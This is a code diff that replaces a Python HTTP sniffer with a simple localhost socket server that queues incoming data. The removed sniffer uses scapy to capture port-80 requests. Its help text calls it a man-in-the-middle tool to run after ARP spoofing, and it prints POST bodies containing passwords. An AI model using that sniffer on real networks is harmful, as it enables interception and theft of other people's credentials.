@@ -1,47 +1,40 @@
-from scapy.all import *
-from scapy.layers.http import HTTPRequest # import HTTP packet
-from colorama import init, Fore
+import socket
+from collections import deque
 
-# initialize colorama
-init()
+# Define the host and port to listen on
+HOST = 'localhost'
+PORT = 8080
 
-# define colors
-GREEN = Fore.GREEN
-RED   = Fore.RED
-RESET = Fore.RESET
+# Create a FIFO queue to store the captured web traffic
+traffic_queue = deque()
 
-def sniff_packets(iface=None):
-    if iface:
-        # port 80 for http (generally)
-        # `process_packet` is the callback
-        sniff(filter="port 80", prn=process_packet, iface=iface, store=False)
-    else:
-        # sniff with default interface
-        sniff(filter="port 80", prn=process_packet, store=False)
+# Create a socket object
+with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
+    # Bind the socket to the host and port
+    server_socket.bind((HOST, PORT))
 
-def process_packet(packet):
-    if packet.haslayer(HTTPRequest):
-        # if this packet is an HTTP Request
-        # get the requested URL
-        url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
-        # get the requester's IP Address
-        ip = packet[IP].src
-        # get the request method
-        method = packet[HTTPRequest].Method.decode()
-        print(f"\n{GREEN}[+] {ip} Requested {url} with {method}{RESET}")
-        if packet.haslayer(Raw) and method == "POST":
-            # if the requested packet is a POST request
-            # then it may have username and password
-            print(f"\n{RED}[*] Some useful Raw data: {packet[Raw].load}{RESET}")
+    # Listen for incoming connections
+    server_socket.listen()
 
-if __name__ == "__main__":
-    import argparse
-    parser = argparse.ArgumentParser(description="HTTP Packet Sniffer, this is useful when you're a man in the middle." \
-                                                 + "It is suggested that you run arp spoof before you use this script, otherwise it'll sniff your personal packets")
-    parser.add_argument("-i", "--iface", help="Interface to use, default is scapy's default interface")
-    parser.add_argument("--show-raw", dest="show_raw", action="store_true", help="Whether to print POST raw data, such as passwords, search queries, etc.")
-    # parse arguments
-    args = parser.parse_args()
-    iface = args.iface
-    show_raw = args.show_raw
-    sniff_packets(iface)
+    print(f"Listening on {HOST}:{PORT}...")
+
+    while True:
+        # Accept a client connection
+        client_socket, client_address = server_socket.accept()
+
+        print(f"Connected to {client_address[0]}:{client_address[1]}")
+
+        # Receive the incoming data
+        data = client_socket.recv(4096)
+
+        # Store the captured web traffic in the FIFO queue
+        traffic_queue.append(data)
+
+        # Process the received data (you can add your own logic here)
+
+        # Send a response back to the client (optional)
+        response = b"HTTP/1.1 200 OK\r\nContent-Length: 12\r\n\r\nHello World!"
+        client_socket.sendall(response)
+
+        # Close the client connection
+        client_socket.close()
